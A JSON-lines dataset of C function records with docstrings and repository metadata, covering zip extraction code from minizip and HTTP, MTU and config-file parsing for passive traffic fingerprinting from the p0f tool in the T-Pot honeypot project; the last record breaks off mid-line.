{"docstring": "/* My own strcmpi / strcasecmp */\n", "func_signal": "local int strcmpcasenosensitive_internal (const char* fileName1, const char* fileName2)", "code": "{\n    for (;;)\n    {\n        char c1=*(fileName1++);\n        char c2=*(fileName2++);\n        if ((c1>='a') && (c1<='z'))\n            c1 -= 0x20;\n        if ((c2>='a') && (c2<='z'))\n            c2 -= 0x20;\n        if (c1=='\\0')\n            return ((c2=='\\0') ? 0 : -1);\n        if (c2=='\\0')\n            return 1;\n        if (c1<c2)\n            return -1;\n        if (c1>c2)\n            return 1;\n    }\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Open for reading data the current file in the zipfile.\n  If there is no error and the file is opened, the return value is UNZ_OK.\n*/\n", "func_signal": "extern int ZEXPORT unzOpenCurrentFile3 (unzFile file, int* method,\n                                            int* level, int raw, const char* password)", "code": "{\n    int err=UNZ_OK;\n    uInt iSizeVar;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    ZPOS64_T offset_local_extrafield;  /* offset of the local extra field */\n    uInt  size_local_extrafield;    /* size of the local extra field */\n#    ifndef NOUNCRYPT\n    char source[12];\n#    else\n    if (password != NULL)\n        return UNZ_PARAMERROR;\n#    endif\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_PARAMERROR;\n\n    if (s->pfile_in_zip_read != NULL)\n        unzCloseCurrentFile(file);\n\n    if (unz64local_CheckCurrentFileCoherencyHeader(s,&iSizeVar, &offset_local_extrafield,&size_local_extrafield)!=UNZ_OK)\n        return UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info = (file_in_zip64_read_info_s*)ALLOC(sizeof(file_in_zip64_read_info_s));\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_INTERNALERROR;\n\n    pfile_in_zip_read_info->read_buffer=(char*)ALLOC(UNZ_BUFSIZE);\n    pfile_in_zip_read_info->offset_local_extrafield = offset_local_extrafield;\n    pfile_in_zip_read_info->size_local_extrafield = size_local_extrafield;\n    pfile_in_zip_read_info->pos_local_extrafield=0;\n    pfile_in_zip_read_info->raw=raw;\n\n    if (pfile_in_zip_read_info->read_buffer==NULL)\n    {\n        TRYFREE(pfile_in_zip_read_info);\n        return UNZ_INTERNALERROR;\n    }\n\n    pfile_in_zip_read_info->stream_initialised=0;\n\n    if (method!=NULL)\n        *method = (int)s->cur_file_info.compression_method;\n\n    if (level!=NULL)\n    {\n        *level = 6;\n        switch (s->cur_file_info.flag & 0x06)\n        {\n          case 6 : *level = 1; break;\n          case 4 : *level = 2; break;\n          case 2 : *level = 9; break;\n        }\n    }\n\n    if ((s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n        (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n        (s->cur_file_info.compression_method!=Z_DEFLATED))\n\n        err=UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info->crc32_wait=s->cur_file_info.crc;\n    pfile_in_zip_read_info->crc32=0;\n    pfile_in_zip_read_info->total_out_64=0;\n    pfile_in_zip_read_info->compression_method = s->cur_file_info.compression_method;\n    pfile_in_zip_read_info->filestream=s->filestream;\n    pfile_in_zip_read_info->z_filefunc=s->z_filefunc;\n    pfile_in_zip_read_info->byte_before_the_zipfile=s->byte_before_the_zipfile;\n\n    pfile_in_zip_read_info->stream.total_out = 0;\n\n    if ((s->cur_file_info.compression_method==Z_BZIP2ED) && (!raw))\n    {\n#ifdef HAVE_BZIP2\n      pfile_in_zip_read_info->bstream.bzalloc = (void *(*) (void *, int, int))0;\n      pfile_in_zip_read_info->bstream.bzfree = (free_func)0;\n      pfile_in_zip_read_info->bstream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->bstream.state = (voidpf)0;\n\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = (voidpf)0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=BZ2_bzDecompressInit(&pfile_in_zip_read_info->bstream, 0, 0);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_BZIP2ED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n#else\n      pfile_in_zip_read_info->raw=1;\n#endif\n    }\n    else if ((s->cur_file_info.compression_method==Z_DEFLATED) && (!raw))\n    {\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = 0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=inflateInit2(&pfile_in_zip_read_info->stream, -MAX_WBITS);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_DEFLATED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n        /* windowBits is passed < 0 to tell that there is no zlib header.\n         * Note that in this case inflate *requires* an extra \"dummy\" byte\n         * after the compressed stream in order to complete decompression and\n         * return Z_STREAM_END.\n         * In unzip, i don't wait absolutely Z_STREAM_END because I known the\n         * size of both compressed and uncompressed data\n         */\n    }\n    pfile_in_zip_read_info->rest_read_compressed =\n            s->cur_file_info.compressed_size ;\n    pfile_in_zip_read_info->rest_read_uncompressed =\n            s->cur_file_info.uncompressed_size ;\n\n\n    pfile_in_zip_read_info->pos_in_zipfile =\n            s->cur_file_info_internal.offset_curfile + SIZEZIPLOCALHEADER +\n              iSizeVar;\n\n    pfile_in_zip_read_info->stream.avail_in = (uInt)0;\n\n    s->pfile_in_zip_read = pfile_in_zip_read_info;\n                s->encrypted = 0;\n\n#    ifndef NOUNCRYPT\n    if (password != NULL)\n    {\n        int i;\n        s->pcrc_32_tab = get_crc_table();\n        init_keys(password,s->keys,s->pcrc_32_tab);\n        if (ZSEEK64(s->z_filefunc, s->filestream,\n                  s->pfile_in_zip_read->pos_in_zipfile +\n                     s->pfile_in_zip_read->byte_before_the_zipfile,\n                  SEEK_SET)!=0)\n            return UNZ_INTERNALERROR;\n        if(ZREAD64(s->z_filefunc, s->filestream,source, 12)<12)\n            return UNZ_INTERNALERROR;\n\n        for (i = 0; i<12; i++)\n            zdecode(s->keys,s->pcrc_32_tab,source[i]);\n\n        s->pfile_in_zip_read->pos_in_zipfile+=12;\n        s->encrypted=1;\n    }\n#    endif\n\n\n    return UNZ_OK;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/* Parse HTTP date field. */\n", "func_signal": "static u32 parse_date(u8* str)", "code": "{\n  struct tm t;\n\n  if (!strptime((char*)str, \"%a, %d %b %Y %H:%M:%S %Z\", &t)) {\n    DEBUG(\"[#] Invalid 'Date' field ('%s').\\n\", str);\n    return 0;\n  }\n\n  return mktime(&t);\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Read p0f.fp line, dispatching it to fingerprinting modules as necessary. */\n", "func_signal": "static void config_parse_line(u8* line)", "code": "{\n\n  u8 *val,*eon;\n\n  /* Special handling for [module:direction]... */\n\n  if (*line == '[') {\n\n    u8* dir;\n\n    line++;\n\n    /* Simplified case for [mtu]. */\n\n    if (!strcmp((char*)line, \"mtu]\")) {\n\n      mod_type = CF_MOD_MTU;\n      state = CF_NEED_LABEL;\n      return;\n\n    }\n\n    dir = (u8*)strchr((char*)line, ':');\n\n    if (!dir) FATAL(\"Malformed section identifier in line %u.\", line_no);\n\n    *dir = 0; dir++;\n\n    if (!strcmp((char*)line, \"tcp\")) {\n\n      mod_type = CF_MOD_TCP;\n\n    } else if (!strcmp((char*)line, \"http\")) {\n\n      mod_type = CF_MOD_HTTP;\n\n    } else {\n\n      FATAL(\"Unrecognized fingerprinting module '%s' in line %u.\", line, line_no);\n\n    }\n\n    if (!strcmp((char*)dir, \"request]\")) {\n\n      mod_to_srv = 1;\n\n    } else if (!strcmp((char*)dir, \"response]\")) {\n\n      mod_to_srv = 0;\n\n    } else {\n\n      FATAL(\"Unrecognized traffic direction in line %u.\", line_no);\n\n    }\n\n    state = CF_NEED_LABEL;\n    return;\n\n  }\n\n  /* Everything else follows the 'name = value' approach. */\n\n  val = line;\n\n  while (isalpha(*val) || *val == '_') val++;\n  eon = val;\n\n  while (isblank(*val)) val++;\n\n  if (line == val || *val != '=')\n    FATAL(\"Unexpected statement in line %u.\", line_no);\n\n  while (isblank(*++val));\n\n  *eon = 0;\n\n  if (!strcmp((char*)line, \"classes\")) {\n\n    if (state != CF_NEED_SECT) \n      FATAL(\"misplaced 'classes' in line %u.\", line_no);\n\n    config_parse_classes(val);\n\n  } else if (!strcmp((char*)line, \"ua_os\")) {\n\n    if (state != CF_NEED_LABEL || mod_to_srv != 1 || mod_type != CF_MOD_HTTP) \n      FATAL(\"misplaced 'us_os' in line %u.\", line_no);\n\n    http_parse_ua(val, line_no);\n\n  } else if (!strcmp((char*)line, \"label\")) {\n\n    /* We will drop sig_sys / sig_flavor on the floor if no signatures\n       actually created, but it's not worth tracking that. */\n\n    if (state != CF_NEED_LABEL && state != CF_NEED_SIG)\n      FATAL(\"misplaced 'label' in line %u.\", line_no);\n\n    config_parse_label(val);\n\n    if (mod_type != CF_MOD_MTU && sig_class < 0) state = CF_NEED_SYS;\n    else state = CF_NEED_SIG;\n\n  } else if (!strcmp((char*)line, \"sys\")) {\n\n    if (state != CF_NEED_SYS)\n      FATAL(\"Misplaced 'sys' in line %u.\", line_no);\n\n    config_parse_sys(val);\n\n    state = CF_NEED_SIG;\n\n  } else if (!strcmp((char*)line, \"sig\")) {\n\n    if (state != CF_NEED_SIG) FATAL(\"Misplaced 'sig' in line %u.\", line_no);\n\n    switch (mod_type) {\n\n      case CF_MOD_TCP:\n        tcp_register_sig(mod_to_srv, generic, sig_class, sig_name, sig_flavor,\n                         label_id, cur_sys, cur_sys_cnt, val, line_no);\n        break;\n\n      case CF_MOD_MTU:\n        mtu_register_sig(sig_flavor, val, line_no);\n        break;\n\n      case CF_MOD_HTTP:\n        http_register_sig(mod_to_srv, generic, sig_class, sig_name, sig_flavor,\n                          label_id, cur_sys, cur_sys_cnt, val, line_no);\n        break;\n\n    }\n\n    sig_cnt++;\n\n  } else {\n\n    FATAL(\"Unrecognized field '%s' in line %u.\", line, line_no);\n\n  }\n\n}", "path": "tpotce/docker/p0f/readfp.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Register a new MTU signature. */\n", "func_signal": "void mtu_register_sig(u8* name, u8* val, u32 line_no)", "code": "{\n\n  u8* nxt = val;\n  s32 mtu;\n  u32 bucket;\n\n  while (isdigit(*nxt)) nxt++;\n\n  if (nxt == val || *nxt) FATAL(\"Malformed MTU value in line %u.\", line_no);\n\n  mtu = atol((char*)val);\n\n  if (mtu <= 0 || mtu > 65535) FATAL(\"Malformed MTU value in line %u.\", line_no);\n\n  bucket = mtu % SIG_BUCKETS;\n\n  sigs[bucket] = DFL_ck_realloc(sigs[bucket], (sig_cnt[bucket] + 1) *\n                                sizeof(struct mtu_sig_record));\n\n  sigs[bucket][sig_cnt[bucket]].mtu = mtu;\n  sigs[bucket][sig_cnt[bucket]].name = name;\n\n  sig_cnt[bucket]++;\n\n}", "path": "tpotce/docker/p0f/fp_mtu.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Dump a HTTP signature. */\n", "func_signal": "static u8* dump_sig(u8 to_srv, struct http_sig* hsig)", "code": "{\n\n  u32 i;\n  u8 had_prev = 0;\n  struct http_id* list;\n\n  u8 tmp[HTTP_MAX_SHOW + 1];\n  u32 tpos;\n\n  static u8* ret;\n  u32 rlen = 0;\n\n  u8* val;\n\n#define RETF(_par...) do { \\\n    s32 _len = snprintf(NULL, 0, _par); \\\n    if (_len < 0) FATAL(\"Whoa, snprintf() fails?!\"); \\\n    ret = DFL_ck_realloc_kb(ret, rlen + _len + 1); \\\n    snprintf((char*)ret + rlen, _len + 1, _par); \\\n    rlen += _len; \\\n  } while (0)\n    \n  RETF(\"%u:\", hsig->http_ver);\n\n  for (i = 0; i < hsig->hdr_cnt; i++) {\n\n    if (hsig->hdr[i].id >= 0) {\n\n      u8 optional = 0;\n\n      /* Check the \"optional\" list. */\n\n      list = to_srv ? req_optional : resp_optional;\n\n      while (list->name) {\n        if (list->id == hsig->hdr[i].id) break;\n        list++;\n      }\n\n      if (list->name) optional = 1;\n\n      RETF(\"%s%s%s\", had_prev ? \",\" : \"\", optional ? \"?\" : \"\",\n           hdr_names[hsig->hdr[i].id]);\n      had_prev = 1;\n\n      if (!(val = hsig->hdr[i].value)) continue;\n\n      /* Next, make sure that the value is not on the ignore list. */\n\n      if (optional) continue;\n\n      list = to_srv ? req_skipval : resp_skipval;\n\n      while (list->name) {\n        if (list->id == hsig->hdr[i].id) break;\n        list++;\n      }\n\n      if (list->name) continue;\n\n      /* Looks like it's not on the list, so let's output a cleaned-up version\n         up to HTTP_MAX_SHOW. */\n\n      tpos = 0;\n\n      while (tpos < HTTP_MAX_SHOW && val[tpos] >= 0x20 && val[tpos] < 0x80 &&\n             val[tpos] != ']' && val[tpos] != '|') {\n\n        tmp[tpos] = val[tpos];\n        tpos++;\n\n      }\n\n      tmp[tpos] = 0;\n\n      if (!tpos) continue;\n\n      RETF(\"=[%s]\", tmp);\n\n    } else {\n\n      RETF(\"%s%s\", had_prev ? \",\" : \"\", hsig->hdr[i].name);\n      had_prev = 1;\n\n      if (!(val = hsig->hdr[i].value)) continue;\n\n      tpos = 0;\n\n      while (tpos < HTTP_MAX_SHOW && val[tpos] >= 0x20 && val[tpos] < 0x80 &&\n             val[tpos] != ']') { tmp[tpos] = val[tpos]; tpos++; }\n\n      tmp[tpos] = 0;\n\n      if (!tpos) continue;\n\n      RETF(\"=[%s]\", tmp);\n\n    }\n\n  }\n\n  RETF(\":\");\n\n  list = to_srv ? req_common : resp_common;\n  had_prev = 0;\n\n  while (list->name) {\n\n    for (i = 0; i < hsig->hdr_cnt; i++) \n      if (hsig->hdr[i].id == list->id) break;\n\n    if (i == hsig->hdr_cnt) {\n      RETF(\"%s%s\", had_prev ? \",\" : \"\", list->name);\n      had_prev = 1;\n    }\n\n    list++;\n\n  }\n\n  RETF(\":\");\n\n  if ((val = hsig->sw)) {\n\n    tpos = 0;\n\n    while (tpos < HTTP_MAX_SHOW &&  val[tpos] >= 0x20 && val[tpos] < 0x80 &&\n           val[tpos] != ']') { tmp[tpos] = val[tpos]; tpos++; }\n\n    tmp[tpos] = 0;\n\n    if (tpos) RETF(\"%s\", tmp);\n\n  }\n\n  return ret;\n\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Parse name=value pairs into a signature. */\n", "func_signal": "static u8 parse_pairs(u8 to_srv, struct packet_flow* f, u8 can_get_more)", "code": "{\n\n  u32 plen = to_srv ? f->req_len : f->resp_len;\n\n  u32 off;\n\n  /* Try to parse name: value pairs. */\n\n  while ((off = f->http_pos) < plen) {\n\n    u8* pay = to_srv ? f->request : f->response;\n\n    u32 nlen, vlen, vstart;\n    s32 hid;\n    u32 hcount;\n\n    /* Empty line? Dispatch for fingerprinting! */\n\n    if (pay[off] == '\\r' || pay[off] == '\\n') {\n\n      f->http_tmp.recv_date = get_unix_time();\n\n      fingerprint_http(to_srv, f);\n\n      /* If this is a request, flush the collected signature and prepare\n         for parsing the response. If it's a response, just shut down HTTP\n         parsing on this flow. */\n\n      if (to_srv) {\n\n        f->http_req_done = 1;\n        f->http_pos = 0;\n\n        free_sig_hdrs(&f->http_tmp);\n        memset(&f->http_tmp, 0, sizeof(struct http_sig));\n\n        return 1;\n\n      } else {\n\n        f->in_http = -1;\n        return 0;\n\n      }\n\n    }\n\n    /* Looks like we're getting a header value. See if we have room for it. */\n\n    if ((hcount = f->http_tmp.hdr_cnt) >= HTTP_MAX_HDRS) {\n\n      DEBUG(\"[#] Too many HTTP headers in a %s.\\n\", to_srv ? \"request\" :\n            \"response\");\n\n      f->in_http = -1;\n      return 0;\n\n    }\n\n    /* Try to extract header name. */\n      \n    nlen = 0;\n\n    while ((isalnum(pay[off]) || pay[off] == '-' || pay[off] == '_') &&\n           off < plen && nlen <= HTTP_MAX_HDR_NAME) {\n\n      off++;\n      nlen++;\n\n    }\n\n    if (off == plen) {\n\n      if (!can_get_more) {\n\n        DEBUG(\"[#] End of HTTP %s before end of headers.\\n\",\n              to_srv ? \"request\" : \"response\");\n        f->in_http = -1;\n\n      }\n\n      return can_get_more;\n\n    }\n\n    /* Empty, excessively long, or non-':'-followed header name? */\n\n    if (!nlen || pay[off] != ':' || nlen > HTTP_MAX_HDR_NAME) {\n\n      DEBUG(\"[#] Invalid HTTP header encountered (len = %u, char = 0x%02x).\\n\",\n            nlen, pay[off]);\n\n      f->in_http = -1;\n      return 0;\n\n    }\n\n    /* At this point, header name starts at f->http_pos, and has nlen bytes.\n       Skip ':' and a subsequent whitespace next. */\n\n    off++;\n\n    if (off < plen && isblank(pay[off])) off++;\n\n    vstart = off;\n    vlen = 0;\n\n    /* Find the next \\n. */\n\n    while (off < plen && vlen <= HTTP_MAX_HDR_VAL && pay[off] != '\\n') {\n\n      off++;\n      vlen++;\n\n    }\n\n    if (vlen > HTTP_MAX_HDR_VAL) {\n      DEBUG(\"[#] HTTP %s header value length exceeded.\\n\",\n            to_srv ? \"request\" : \"response\");\n      f->in_http = -1;\n      return -1;\n    }\n\n    if (off == plen) {\n\n      if (!can_get_more) {\n        DEBUG(\"[#] End of HTTP %s before end of headers.\\n\",\n              to_srv ? \"request\" : \"response\");\n        f->in_http = -1;\n      }\n\n      return can_get_more;\n\n    }\n\n    /* If party is using \\r\\n terminators, go back one char. */\n\n    if (pay[off - 1] == '\\r') vlen--;\n \n    /* Header value starts at vstart, and has vlen bytes (may be zero). Record\n       this in the signature. */\n\n    hid = lookup_hdr(pay + f->http_pos, nlen, 0);\n\n    f->http_tmp.hdr[hcount].id = hid;\n\n    if (hid < 0) {\n\n      /* Header ID not found, store literal value. */\n\n      f->http_tmp.hdr[hcount].name = ck_memdup_str(pay + f->http_pos, nlen);\n\n    } else {\n\n      /* Found - update Bloom filter. */\n\n      f->http_tmp.hdr_bloom4 |= bloom4_64(hid);\n\n    }\n\n    /* If there's a value, store that too. For U-A and Server, also update\n       'sw'; and for requests, collect Accept-Language. */\n\n    if (vlen) {\n\n      u8* val = ck_memdup_str(pay + vstart, vlen);\n\n      f->http_tmp.hdr[hcount].value = val;\n\n      if (to_srv) {\n\n        switch (hid) {\n          case HDR_UA: f->http_tmp.sw = val; break;\n          case HDR_AL: f->http_tmp.lang = val; break;\n          case HDR_VIA:\n          case HDR_XFF: f->http_tmp.via = val; break;\n        }\n\n      } else {\n\n        switch (hid) {\n\n          case HDR_SRV: f->http_tmp.sw = val; break;\n          case HDR_DAT: f->http_tmp.date = parse_date(val); break;\n          case HDR_VIA:\n          case HDR_XFF: f->http_tmp.via = val; break;\n\n        }\n\n      }\n\n    }\n\n    /* Moving on... */\n\n    f->http_tmp.hdr_cnt++;\n    f->http_pos = off + 1; \n\n  }\n\n  if (!can_get_more) {\n    DEBUG(\"[#] End of HTTP %s before end of headers.\\n\",\n          to_srv ? \"request\" : \"response\");\n    f->in_http = -1;\n  }\n\n  return can_get_more;\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Parse 'classes' parameter by populating fp_os_classes. */\n", "func_signal": "static void config_parse_classes(u8* val)", "code": "{\n\n  while (*val) {\n\n    u8* nxt;\n\n    while (isblank(*val) || *val == ',') val++;\n\n    nxt = val;\n\n    while (isalnum(*nxt)) nxt++;\n\n    if (nxt == val || (*nxt && *nxt != ','))\n      FATAL(\"Malformed class entry in line %u.\", line_no);\n\n    fp_os_classes = DFL_ck_realloc(fp_os_classes, (class_cnt + 1) * sizeof(u8*));\n\n    fp_os_classes[class_cnt++] = DFL_ck_memdup_str(val, nxt - val);\n\n    val = nxt;\n\n  }\n\n}", "path": "tpotce/docker/p0f/readfp.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Look up HTTP signature, create an observation. */\n", "func_signal": "static void fingerprint_http(u8 to_srv, struct packet_flow* f)", "code": "{\n\n  struct http_sig_record* m;\n  u8* lang = NULL;\n\n  http_find_match(to_srv, &f->http_tmp, 0);\n\n  start_observation(to_srv ? \"http request\" : \"http response\", 4, to_srv, f);\n\n  if ((m = f->http_tmp.matched)) {\n\n    OBSERVF((m->class_id < 0) ? \"app\" : \"os\", \"%s%s%s\",\n            fp_os_names[m->name_id], m->flavor ? \" \" : \"\",\n            m->flavor ? m->flavor : (u8*)\"\");\n\n  } else add_observation_field(\"app\", NULL);\n\n  if (f->http_tmp.lang && isalpha(f->http_tmp.lang[0]) &&\n      isalpha(f->http_tmp.lang[1]) && !isalpha(f->http_tmp.lang[2])) {\n\n    u8 lh = LANG_HASH(f->http_tmp.lang[0], f->http_tmp.lang[1]);\n    u8 pos = 0;\n\n    while (languages[lh][pos]) {\n      if (f->http_tmp.lang[0] == languages[lh][pos][0] &&\n          f->http_tmp.lang[1] == languages[lh][pos][1]) break;\n      pos += 2;\n    }\n\n    if (!languages[lh][pos]) add_observation_field(\"lang\", NULL);\n      else add_observation_field(\"lang\", \n           (lang = (u8*)languages[lh][pos + 1]));\n\n  } else add_observation_field(\"lang\", (u8*)\"none\");\n\n  add_observation_field(\"params\", dump_flags(&f->http_tmp, m));\n\n  add_observation_field(\"raw_sig\", dump_sig(to_srv, &f->http_tmp));\n\n  score_nat(to_srv, f);\n\n  /* Save observations needed to score future responses. */\n\n  if (!to_srv) {\n\n    /* For server response, always store the signature. */\n\n    ck_free(f->server->http_resp);\n    f->server->http_resp = ck_memdup(&f->http_tmp, sizeof(struct http_sig));\n\n    f->server->http_resp->hdr_cnt = 0;\n    f->server->http_resp->sw   = NULL;\n    f->server->http_resp->lang = NULL;\n    f->server->http_resp->via  = NULL;\n\n    f->server->http_resp_port = f->srv_port;\n\n    if (lang) f->server->language = lang;\n\n    if (m) {\n\n      if (m->class_id != -1) {\n\n        /* If this is an OS signature, update host record. */\n\n        f->server->last_class_id = m->class_id;\n        f->server->last_name_id  = m->name_id;\n        f->server->last_flavor   = m->flavor;\n        f->server->last_quality  = (m->generic * P0F_MATCH_GENERIC);\n\n      } else {\n\n        /* Otherwise, record app data. */\n\n        f->server->http_name_id = m->name_id;\n        f->server->http_flavor  = m->flavor;\n\n        if (f->http_tmp.dishonest) f->server->bad_sw = 2;\n\n      }\n\n    }\n\n  } else {\n\n    if (lang) f->client->language = lang;\n\n    if (m) {\n\n      if (m->class_id != -1) {\n\n        /* Client request - only OS sig is of any note. */\n\n        ck_free(f->client->http_req_os);\n        f->client->http_req_os = ck_memdup(&f->http_tmp,\n          sizeof(struct http_sig));\n\n        f->client->http_req_os->hdr_cnt = 0;\n        f->client->http_req_os->sw   = NULL;\n        f->client->http_req_os->lang = NULL;\n        f->client->http_req_os->via  = NULL;\n\n        f->client->last_class_id = m->class_id;\n        f->client->last_name_id  = m->name_id;\n        f->client->last_flavor   = m->flavor;\n\n        f->client->last_quality  = (m->generic * P0F_MATCH_GENERIC);\n\n      } else {\n\n        /* Record app data for the API. */\n\n        f->client->http_name_id = m->name_id;\n        f->client->http_flavor  = m->flavor;\n\n        if (f->http_tmp.dishonest) f->client->bad_sw = 2;\n\n      }\n \n    }\n\n  }\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Parse 'sys' parameter into cur_sys[]. */\n", "func_signal": "static void config_parse_sys(u8* val)", "code": "{\n\n  if (cur_sys) {\n    cur_sys = NULL;\n    cur_sys_cnt = 0;\n  }\n\n  while (*val) {\n\n    u8* nxt;\n    u8  is_cl = 0, orig;\n    u32 i;\n\n    while (isblank(*val) || *val == ',') val++;\n\n    if (*val == '@') { is_cl = 1; val++; }\n\n    nxt = val;\n\n    while (isalnum(*nxt) || (*nxt && strchr(NAME_CHARS, *nxt))) nxt++;\n\n    if (nxt == val || (*nxt && *nxt != ','))\n      FATAL(\"Malformed sys entry in line %u.\", line_no);\n\n    orig = *nxt;\n    *nxt = 0;\n\n    if (is_cl) {\n\n      for (i = 0; i < class_cnt; i++)\n        if (!strcasecmp((char*)val, (char*)fp_os_classes[i])) break;\n\n      if (i == class_cnt)\n        FATAL(\"Unknown class '%s' in line %u.\", val, line_no);\n\n      i |= SYS_CLASS_FLAG;\n\n    } else {\n\n      for (i = 0; i < name_cnt; i++)\n        if (!strcasecmp((char*)val, (char*)fp_os_names[i])) break;\n\n      if (i == name_cnt) {\n        fp_os_names = DFL_ck_realloc(fp_os_names, (name_cnt + 1) * sizeof(u8*));\n        fp_os_names[name_cnt++] = DFL_ck_memdup_str(val, nxt - val);\n      }\n\n    }\n\n    cur_sys = DFL_ck_realloc(cur_sys, (cur_sys_cnt + 1) * 4);\n    cur_sys[cur_sys_cnt++] = i;\n\n    *nxt = orig;\n    val = nxt;\n\n  }\n\n}", "path": "tpotce/docker/p0f/readfp.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Register new HTTP signature. */\n", "func_signal": "void http_register_sig(u8 to_srv, u8 generic, s32 sig_class, u32 sig_name,\n                       u8* sig_flavor, u32 label_id, u32* sys, u32 sys_cnt,\n                       u8* val, u32 line_no)", "code": "{\n\n  struct http_sig* hsig;\n  struct http_sig_record* hrec;\n\n  u8* nxt;\n\n  hsig = DFL_ck_alloc(sizeof(struct http_sig));\n\n  sigs[to_srv] = DFL_ck_realloc(sigs[to_srv], sizeof(struct http_sig_record) *\n    (sig_cnt[to_srv] + 1));\n\n  hrec = &sigs[to_srv][sig_cnt[to_srv]];\n\n  if (val[1] != ':') FATAL(\"Malformed signature in line %u.\", line_no);\n\n  /* http_ver */\n\n  switch (*val) {\n    case '0': break;\n    case '1': hsig->http_ver = 1; break;\n    case '*': hsig->http_ver = -1; break;\n    default: FATAL(\"Bad HTTP version in line %u.\", line_no);\n  }\n\n  val += 2;\n\n  /* horder */\n\n  while (*val != ':') {\n\n    u32 id;\n    u8 optional = 0;\n\n    if (hsig->hdr_cnt >= HTTP_MAX_HDRS)\n      FATAL(\"Too many headers listed in line %u.\", line_no);\n\n    nxt = val;\n\n    if (*nxt == '?') { optional = 1; val++; nxt++; }\n\n    while (isalnum(*nxt) || *nxt == '-' || *nxt == '_') nxt++;\n\n    if (val == nxt)\n      FATAL(\"Malformed header name in line %u.\", line_no);\n\n    id = lookup_hdr(val, nxt - val, 1);\n\n    hsig->hdr[hsig->hdr_cnt].id = id;\n    hsig->hdr[hsig->hdr_cnt].optional = optional;\n\n    if (!optional) hsig->hdr_bloom4 |= bloom4_64(id);\n\n    val = nxt;\n\n    if (*val == '=') {\n\n      if (val[1] != '[') \n        FATAL(\"Missing '[' after '=' in line %u.\", line_no);\n\n      val += 2;\n      nxt = val;\n\n      while (*nxt && *nxt != ']') nxt++;\n\n      if (val == nxt || !*nxt)\n        FATAL(\"Malformed signature in line %u.\", line_no);\n\n      hsig->hdr[hsig->hdr_cnt].value = DFL_ck_memdup_str(val, nxt - val);\n\n      val = nxt + 1;\n\n    }\n\n    hsig->hdr_cnt++;\n\n    if (*val == ',') val++; else if (*val != ':')\n      FATAL(\"Malformed signature in line %u.\", line_no);\n\n  }\n\n  val++;\n\n  /* habsent */\n\n  while (*val != ':') {\n\n    u32 id;\n\n    if (hsig->miss_cnt >= HTTP_MAX_HDRS)\n      FATAL(\"Too many headers listed in line %u.\", line_no);\n\n    nxt = val;\n    while (isalnum(*nxt) || *nxt == '-' || *nxt == '_') nxt++;\n\n    if (val == nxt)\n      FATAL(\"Malformed header name in line %u.\", line_no);\n\n    id = lookup_hdr(val, nxt - val, 1);\n\n    hsig->miss[hsig->miss_cnt] = id;\n\n    val = nxt;\n\n    hsig->miss_cnt++;\n\n    if (*val == ',') val++; else if (*val != ':')\n      FATAL(\"Malformed signature in line %u.\", line_no);\n\n  }\n\n  val++;\n\n  /* exp_sw */\n\n  if (*val) {\n\n    if (strchr((char*)val, ':'))\n      FATAL(\"Malformed signature in line %u.\", line_no);\n\n    hsig->sw = DFL_ck_strdup(val);\n\n  }\n\n  http_find_match(to_srv, hsig, 1);\n\n  if (hsig->matched)\n    FATAL(\"Signature in line %u is already covered by line %u.\",\n          line_no, 